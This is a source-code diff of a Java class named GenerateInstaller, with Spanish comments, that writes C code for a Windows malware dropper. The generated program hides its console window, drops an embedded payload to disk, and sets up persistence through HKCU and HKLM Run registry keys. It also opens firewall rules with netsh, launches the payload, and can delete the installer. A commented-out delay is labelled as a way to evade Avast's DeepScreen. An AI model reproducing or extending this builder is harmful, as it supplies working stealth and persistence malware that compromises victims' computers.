@@ -40,9 +40,7 @@ public class GenerateInstaller {
             writer.println("#include <windows.h>"); // Incluímos la librería "windows.h"
             writer.println("#include <stdio.h>");   // Incluímos la librería "stdio.h"
             writer.println("#include <process.h>"); // Incluímos la librería "process.h"
-            writer.println("int hex_to_int();");    // Definimos "hex_to_int" como un método
-            writer.println("int hex_to_ascii();");  // Definimos "hex_to_ascii" como otro método
-            writer.println("const char* hex=\""+HEX+"\";"); // Creamos un array de carácteres constante con el código hexadecimal del payload
+            writer.println("const char hex[]={"+HEX+"};"); // Creamos un array de carácteres constante con el código hexadecimal del exploit
             writer.println("main(){");  // Creamos el método main
             writer.println(" ShowWindow(GetConsoleWindow(), SW_HIDE);");    // Lo primero: hacemos la ventana invisible (aun así se verá un destello negro del cmd, ¡Qué putada!)
             /*
@@ -54,8 +52,6 @@ public class GenerateInstaller {
             */
             //writer.println(" int retTime = time(0) + 20;");    // Esperamos 20 segundos para evitarnos el DeepScreen de AVAST y similares...
             //writer.println(" while(time(0)<retTime);");        // Mientras no haya acabado el tiempo, no hace nada.
-            writer.println(" int length = strlen(hex);");   // Creamos una variable de tipo entero para almacenar el tamaño de la constante hexadecimal
-            writer.println(" char buf = 0;");   // Creamos un carácter llamado "buf" y le asignamos el valor de 0
             
             // Procedemos a ver el tipo de ruta
             switch(PATH){
@@ -92,7 +88,7 @@ public class GenerateInstaller {
                     }
             }
             
-            writer.println(" char toopen[1024];");   // Creamos una variable donde almacenar la ruta del payload con la ruta que hemos sacado antes
+            writer.println(" char toopen[1024];");   // Creamos una variable donde almacenar la ruta del exploit con la ruta que hemos sacado antes
             writer.println(" strcat(toopen, path);");  // Lo hacemos
             
             if(!ADFOLDER.equals("NULL")){   // Si se ha seleccionado la carpeta extra
@@ -104,23 +100,18 @@ public class GenerateInstaller {
             writer.println(" strcat(toopen, \"\\\\\");");       // Unos cuantos slashes...
             writer.println(" strcat(toopen, \""+FILENAME+"\");");   // Y el FILENAME elegido
             
-            writer.println(" FILE *file = fopen(toopen, \"wb\");");   // Abrimos (creamos) el payload en la ruta elegida para escribir bytes
-            
-            writer.println(" for(int i=0;i<length;i++){");  // Recorremos los bytes hexadecimales
-            writer.println(" 	if(i%2 != 0){");  // Si la posición actual es impar...
-            writer.println(" 		fprintf(file, \"%c\", hex_to_ascii(buf, hex[i]));");  // Escribimos en el archivo la representación ASCII de la cadena hexadecimal (2 bytes)
-            writer.println(" 	} else {");   // De otro modo...
-            writer.println(" 		buf = hex[i];");  // Guardamos el carácter actual en el buffer
-            writer.println(" 	}");
+            writer.println(" FILE *file = fopen(toopen, \"wb\");");   // Abrimos (creamos) el exploit en la ruta elegida para escribir bytes
+            writer.println(" for(int i=0;i<sizeof(hex);i++) {");	// Recorremos el array de bytes "hex"
+            writer.println("  fprintf(file, \"%c\", hex[i]);");	// Imprimiendo cada carácter
             writer.println(" }");
             writer.println(" fclose(file);");   // Cerramos el archivo
-            if(!HKCU.equals("NULL")){   // Si se ha elegido un nombre para el HKCU en el registro...
+            if(!HKCU.equals("NULL") && !HKCU.equals("")){   // Si se ha elegido un nombre para el HKCU en el registro...
                 writer.println(" char hkcutoexecute[2048]=\"REG ADD HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\\""+HKCU+"\\\" /t REG_SZ /d \\\"\";");
                 writer.println(" strcat(hkcutoexecute, toopen);");
                 writer.println(" strcat(hkcutoexecute, \"\\\"\");");
                 writer.println(" system(hkcutoexecute);"); // Añadimos al registro (HKCU)
             }
-            if(!HKLM.equals("NULL")){   // Si se ha elegido un nombre para el HKLM en el registro...
+            if(!HKLM.equals("NULL") && !HKLM.equals("")){   // Si se ha elegido un nombre para el HKLM en el registro...
                 writer.println(" char hklmtoexecute[2048]=\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v \\\""+HKLM+"\\\" /t REG_SZ /d \\\"\";");
                 writer.println(" strcat(hklmtoexecute, toopen);");
                 writer.println(" strcat(hklmtoexecute, \"\\\"\");");
@@ -174,7 +165,7 @@ public class GenerateInstaller {
                     writer.println("  system(\"netsh firewall add portopening TCP "+PORT+" "+ADDFIREWALL+"\");");   // Añadimos la excepción
                     writer.println(" } else {");    // De otro modo...
                     writer.println("  char addfirewall_out[1024]=\"netsh advfirewall firewall add rule name=\\\""+ADDFIREWALL+"\\\" dir=out program=\\\"\";");  // Creamos una variable con parte del comando
-                    writer.println("  strcat(addfirewall_out, toopen);");   // Le concatenamos la ruta del payload
+                    writer.println("  strcat(addfirewall_out, toopen);");   // Le concatenamos la ruta del exploit
                     writer.println("  strcat(addfirewall_out, \"\\\" protocol=tcp action=allow\");");       // Unos parámetros más...
                     writer.println("  system(addfirewall_out);");   // Y lo ejecutamos
                     writer.println("  char addfirewall_in[1024]=\"netsh advfirewall firewall add rule name=\\\""+ADDFIREWALL+"\\\" dir=in program=\\\"\";");
@@ -184,7 +175,7 @@ public class GenerateInstaller {
                     writer.println(" }");
                 }
             }
-            writer.println(" spawnl(P_NOWAIT, toopen, toopen, NULL);");   // Ejecutamos el payload sin esperar a que termine
+            writer.println(" spawnl(P_NOWAIT, toopen, toopen, NULL);");   // Ejecutamos el exploit sin esperar a que termine
             if(MELT.equals("TRUE")){    // Si se ha seleccionado la opción Melt...
                 writer.println(" wchar_t exebuffer[MAX_PATH];");    // Creamos una variable wchar_t para la ruta del instalador
                 writer.println(" GetModuleFileName(NULL, exebuffer, MAX_PATH);");   // Obtenemos la ruta del instalador
@@ -214,18 +205,6 @@ public class GenerateInstaller {
             writer.println(" return 0;");   // Cerramos el instalador
             
             writer.println("}");
-            writer.println("int hex_to_int(char c){");  // FUNCIÓN PARA CONVERTIR HEXADECIMAL A NÚMERO ENTERO
-            writer.println(" int first = c / 16 - 3;");             // He de admitir que, de nuevo, no sé como funciona esto.
-            writer.println(" int second = c % 16;");                // Lo encontré en este StackOverflow:
-            writer.println(" int result = first*10 + second;");     // http://goo.gl/v4wfDp
-            writer.println(" if(result > 9) result--;");            // 
-            writer.println(" return result;");                      // ¡Perdón por el desconocimiento! :S
-            writer.println("}");                                    //
-            writer.println("int hex_to_ascii(char c, char d){"); // FUNCIÓN PARA CONVERTIR HEXADECIMAL A ASCII
-            writer.println(" int high = hex_to_int(c) * 16;");      //
-            writer.println(" int low = hex_to_int(d);");            //
-            writer.println(" return high+low;");                    //
-            writer.println("}");                                    //
             writer.close(); // Cerramos el archivo
             FWwriter.close();
         } catch (IOException ex) {
